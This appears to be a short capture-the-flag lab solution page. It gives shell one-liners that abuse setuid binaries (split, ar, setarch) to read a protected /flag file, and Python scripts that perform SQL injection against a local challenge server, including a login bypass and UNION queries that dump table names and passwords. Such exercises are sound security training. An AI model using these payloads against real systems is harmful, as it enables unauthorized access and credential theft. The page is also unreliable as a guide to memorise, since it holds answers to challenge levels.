# Lab 2

**Note** : [Back to index](index.md)

## SUID Exploitation

* Level 16

```bash
split /flag

cat xaa
```


* Level 21 

``` bash
ar r inter /flag

cat inter
```
* Level 30 

``` bash
setarch --uname-2.6 cat /flag
```
## SQLi 

* Level 3 
``` python 
import requests 

URL = "http://challenge.localhost:80/?user=1" 

r = requests.get(url = URL) 

print(r.content)
```

* Level 4
``` python
import requests 

form = { "username" : 'flag" --', "password" : "idk", } 

response = requests.post("http://challenge.localhost/", data=form) 

print(response,"\n",response.text)
```

* Level 6

``` python
import requests 

params = {"query": '" UNION SELECT tbl_name from sqlite_master --'} 

response = requests.post("http://challenge.localhost/", params=params) 

t_name = response.text.strip()

params = {"query": f'" UNION SELECT password from {t_name} --' }

response = requests.post("http://challenge.localhost/", params=params) 

print(response.text.strip())
```
